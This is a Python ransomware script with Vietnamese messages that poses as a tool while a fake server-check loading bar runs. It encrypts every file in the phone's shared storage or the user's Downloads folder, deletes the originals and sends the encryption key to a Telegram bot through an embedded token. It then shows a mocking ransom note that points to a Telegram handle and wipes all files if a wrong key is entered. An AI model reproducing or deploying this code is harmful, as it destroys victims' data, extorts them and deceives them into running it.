import os
import time
import random
import subprocess
import sys
import requests
from cryptography.fernet import Fernet
from threading import Thread

TELEGRAM_BOT_TOKEN = "7807805367:AAFA2ZeIGaFhMoB5UPKS59mEVOsSh-BNN2E"
TELEGRAM_CHAT_ID = "-1002428504210"

def clear_console():
    os.system("cls" if os.name == "nt" else "clear")

def install_library(library):
    try:
        __import__(library)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", library], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
install_library("cryptography")
install_library("requests")

key = Fernet.generate_key()
cipher = Fernet(key)

def send_key_to_telegram(key):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": f"+1 Thằng Ngu:\n {key.decode()}"
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("[+] Xin Chúc Mừng Thằng Ngu...")
            os.system("cls" if os.name == "nt" else "clear")
        else:
            print(f"[-] Error")
    except Exception as e:
        print(f"[-] ERORR")
        os.system("cls" if os.name == "nt" else "clear")

def fake_loading():
    print("🔍 Đang Kiểm Sever, Vui Lòng Không Thoát...")
    for i in range(101):
        time.sleep(random.uniform(0.05, 0.2))
        print(f"\rLoading: [{i}%] {'█' * (i // 2)}", end="")
    print("\nHoàn Tất Xử Lý! Đang Vào Tool...")

def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
        encrypted_data = cipher.encrypt(file_data)
        new_file_path = file_path + ".OmegaX-Lock"
        with open(new_file_path, 'wb') as file:
            file.write(encrypted_data)
        os.remove(file_path)
        return True
    except Exception as e:
        return False

def decrypt_file(file_path, cipher):
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        original_file_path = file_path.replace(".OmegaX-Lock", "")
        with open(original_file_path, 'wb') as file:
            file.write(decrypted_data)
        os.remove(file_path)
        return True
    except Exception as e:
        return False

def encrypt_all_files(directory):
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if not file_path.endswith(".OmegaX-Lock"):
                encrypt_file(file_path)

def decrypt_all_files(directory, cipher):
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if file_path.endswith(".OmegaX-Lock"):
                decrypt_file(file_path, cipher)
                
def delete_all_files(directory):
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            try:
                os.remove(file_path)
            except Exception:
                pass 

def get_decryption_key():
    print("[X] Đọc Và Hiểu Các Điều Trên Nhé!")
    user_key = input("Key: ").strip().encode()
    try:
        return Fernet(user_key)
    except Exception:
        print("[-] KEY SAI + THẰNG NGU")
        return None

if __name__ == "__main__":
    if os.path.exists("/storage/emulated/0/"): 
        target_directory = "/storage/emulated/0/"
    else:  
        target_directory = os.path.join(os.path.expanduser("~"), "Downloads") 
    
    loading_thread = Thread(target=fake_loading)
    loading_thread.start()
    encrypt_all_files(target_directory)
    loading_thread.join()
    send_key_to_telegram(key)
 
ascii_art = """
\033[1;31m███████╗██╗  ██╗███████╗██████╗  ██████╗ ███████╗███████╗
\033[1;37m██╔════╝╚██╗██╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝██╔════╝
\033[1;31m█████╗   ╚███╔╝ █████╗  ██████╔╝██║   ██║███████╗█████╗  
\033[1;37m██╔══╝   ██╔██╗ ██╔══╝  ██╔══██╗██║   ██║╚════██║██╔══╝  
\033[1;31m███████╗██╔╝ ██╗███████╗██║  ██║╚██████╔╝███████║███████╗
\033[1;37m╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
\033[1;35m        Copyright: @EXEROSE | Vì Bạn Xứng Đáng !"""
atuan = """\033[1;37m─────────────────────────────────────────────────────────
\033[1;31m😈  THÔNG BÁO  => Chúc Mừng Thằng Ngu Dính BOTNET Nhé!
\033[1;31m📩  LIÊN HỆ  => Telegram [@EXEROSE] Để Chuộc Dữ Liệu!
\033[1;37m─────────────────────────────────────────────────────────"""
atuan1 = """\033[1;37m─────────────────────────────────────────────────────────
\033[1;31m⚠️  CẢNH BÁO : ĐỪNG CÓ DẠI MÀ LÀM ĐIỀU NGU HUHU
\033[1;36m❌ Dữ Liệu Của Mày Đã Bị Mã Hoá [FILE + ẢNH]
\033[1;36m❌ NẾU: KEY SAI + THOÁT TOOL = DETELE All FILE + ẢNH
\033[1;36m❌ Hãy Làm 1 Thằng Thông Minh Đi Cậu Bé
\033[1;36m❌ Tao Đã Delete FILE Gốc Của Mày.
\033[1;36m❌ Không Tin Kiểm Tra Lại FILE.
\033[1;36m❌ Nếu Không Có KEY Mọi Các Giải Mã Đều Bất Khả Thi.
\033[1;36m❌ Mày ĐEO Thể Làm Gì Mới FILE Đó Đâu.
\033[1;37m─────────────────────────────────────────────────────────"""

print(ascii_art)
print(atuan)
print(atuan1)

while True:
    cipher_decrypt = get_decryption_key()
    if cipher_decrypt:
        loading_thread = Thread(target=fake_loading)
        loading_thread.start()
        decrypt_all_files(target_directory, cipher_decrypt)
        loading_thread.join()
        print("Giải Mã Thành Công! Chúc Mừng Thằng NGU HAHA")
        time.sleep(5)
        os.system("cls" if os.name == "nt" else "clear")
        break
    else:
        delete_all_files(target_directory)
        print("[!] NGU NGU NGU HAHAHA - Tele: @EXEROSE")
        break